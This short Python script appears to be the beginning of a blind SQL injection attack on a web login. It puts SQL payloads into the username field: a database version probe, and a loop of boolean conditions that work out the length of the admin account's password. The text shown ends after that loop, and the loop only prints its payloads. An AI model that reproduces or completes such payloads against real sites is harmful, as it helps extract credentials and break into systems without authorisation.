import requests

obj = {'user': "trong' AND (SELECT version ()) -- -",'pass': 'a'}

print("[+] Checking password length ..............")
for i in range(1,100):
    obj["user"] = " admin' AND (SELECT 'a' FROM users WHERE user='admin' AND LENGTH(pass)> ? )='a "
    k = obj["user"].replace("?",str(i))
    print(k)